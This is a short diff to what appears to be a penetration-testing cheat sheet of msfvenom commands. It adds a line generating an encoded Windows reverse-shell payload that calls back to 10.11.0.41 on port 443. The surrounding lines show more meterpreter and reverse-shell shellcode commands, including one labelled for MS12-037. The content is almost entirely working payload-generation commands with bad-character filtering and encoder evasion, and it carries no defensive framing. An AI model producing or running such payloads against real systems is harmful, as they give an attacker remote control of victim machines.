@@ -26,6 +26,7 @@ msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.11.0.41 LPORT=443 -a x86 --
 
 6. Payload with exitfunction thread - It will not crash the application
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.11.0.41 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -a x86 --platform windows EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 
 7. Reverse sell payload for MS12-037 in format unicode character
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -a x86 -f js_le --platform Windows -e generic/none
